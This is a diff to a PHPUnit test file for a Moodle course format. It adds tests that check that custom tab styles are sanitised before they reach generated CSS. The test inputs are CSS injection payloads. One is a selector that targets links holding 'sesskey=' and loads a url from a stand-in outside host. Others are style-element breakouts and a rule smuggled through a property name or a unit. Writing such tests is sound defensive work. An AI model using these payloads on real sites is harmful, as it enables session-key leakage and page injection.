@@ -29,24 +29,23 @@ use PHPUnit\Framework\Attributes\Group;
 #[CoversClass(header::class)]
 final class header_test extends \advanced_testcase {
     /**
-     * Create a course with three sections using the given tabstyles and return the generated CSS.
+     * Create a course with one section per entry using the given tabstyles and return the generated CSS.
      *
-     * @param array $others Value of the "others" rule for each of the three sections.
+     * @param array $sectionstyles Tabstyles structure (type => rule => value) for each section.
      * @return string The CSS passed to the template.
      */
-    private function get_generated_css(array $others): string {
+    private function get_css_for_tabstyles(array $sectionstyles): string {
         global $PAGE;
 
         $this->resetAfterTest();
         $this->setAdminUser();
         set_config('enablecustomstyles', 1, 'format_onetopic');
 
-        $course = $this->getDataGenerator()->create_course(['format' => 'onetopic', 'numsections' => 3]);
+        $course = $this->getDataGenerator()->create_course(['format' => 'onetopic', 'numsections' => count($sectionstyles)]);
         $format = course_get_format($course);
-        foreach ($others as $number => $value) {
+        foreach ($sectionstyles as $number => $styles) {
             $section = get_fast_modinfo($course)->get_section_info($number + 1);
-            $tabstyles = json_encode(['default' => ['others' => $value]]);
-            $format->update_section_format_options(['id' => $section->id, 'tabstyles' => $tabstyles]);
+            $format->update_section_format_options(['id' => $section->id, 'tabstyles' => json_encode($styles)]);
         }
         rebuild_course_cache($course->id, true);
 
@@ -60,6 +59,21 @@ final class header_test extends \advanced_testcase {
     }
 
     /**
+     * Create a course with three sections using the given "others" rules and return the generated CSS.
+     *
+     * @param array $others Value of the "others" rule for each of the three sections.
+     * @return string The CSS passed to the template.
+     */
+    private function get_generated_css(array $others): string {
+        $sectionstyles = [];
+        foreach ($others as $value) {
+            $sectionstyles[] = ['default' => ['others' => $value]];
+        }
+
+        return $this->get_css_for_tabstyles($sectionstyles);
+    }
+
+    /**
      * Markup split over several sections must not end up in the generated CSS.
      */
     public function test_cssstyles_cannot_break_out_of_style_element_violation(): void {
@@ -67,6 +81,62 @@ final class header_test extends \advanced_testcase {
 
         $this->assertStringNotContainsString('<', $css);
         $this->assertStringNotContainsString('</style', $css);
+    }
+
+    /**
+     * Braces in a value must not close the generated rule.
+     */
+    public function test_cssstyles_braces_cannot_leave_rule_violation(): void {
+        $others = [
+            'x;}:root a[href*="sesskey="]{background:url(//extern.example/probe)}',
+            'a{color:red',
+            'color: blue',
+        ];
+        $css = $this->get_generated_css($others);
+
+        $this->assertStringNotContainsString('}:root', $css);
+        $this->assertStringNotContainsString('a{color', $css);
+        $this->assertStringContainsString('x;:root a[href*="sesskey="]background:url(//extern.example/probe);', $css);
+        $this->assertStringContainsString('color: blue;', $css);
+    }
+
+    /**
+     * Property names other than plain CSS names must be dropped.
+     */
+    public function test_cssstyles_invalid_property_name_is_dropped_violation(): void {
+        $css = $this->get_css_for_tabstyles([
+            ['default' => ['</style ' => 'x', 'color;}body{x' => 'y', 'color' => 'red']],
+            ['default' => ['others' => '><img src=x>']],
+        ]);
+
+        $this->assertStringNotContainsString('/style', $css);
+        $this->assertStringNotContainsString('}body{', $css);
+        $this->assertStringContainsString('color:red;', $css);
+    }
+
+    /**
+     * The unit appended to a value must be sanitised as well.
+     */
+    public function test_cssstyles_unit_is_sanitised_violation(): void {
+        $css = $this->get_css_for_tabstyles([
+            ['default' => ['font-size' => '12', 'unit-font-size' => 'px}a{color:red']],
+        ]);
+
+        $this->assertStringContainsString('font-size:12pxacolor:red;', $css);
+        $this->assertStringNotContainsString('}a{', $css);
+    }
+
+    /**
+     * Values that are not scalars must be skipped.
+     */
+    public function test_cssstyles_non_scalar_values_are_skipped_violation(): void {
+        $css = $this->get_css_for_tabstyles([
+            ['default' => ['color' => null, 'border-color' => ['a' => 'b'], 'font-weight' => 'bold']],
+        ]);
+
+        $this->assertStringNotContainsString('border-color', $css);
+        $this->assertStringNotContainsString('{color:', $css);
+        $this->assertStringContainsString('font-weight:bold;', $css);
     }
 
     /**
